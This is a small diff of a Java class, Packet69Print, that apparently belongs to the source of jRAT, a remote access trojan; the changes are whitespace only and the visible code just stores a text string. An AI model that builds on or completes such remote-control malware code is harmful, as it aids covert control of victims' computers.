@@ -4,11 +4,10 @@ import java.io.DataOutputStream;
 
 import pro.jrat.Slave;
 
-
 public class Packet69Print extends AbstractOutgoingPacket {
-	
+
 	private String text;
-	
+
 	public Packet69Print(String text) {
 		this.text = text;
 	}
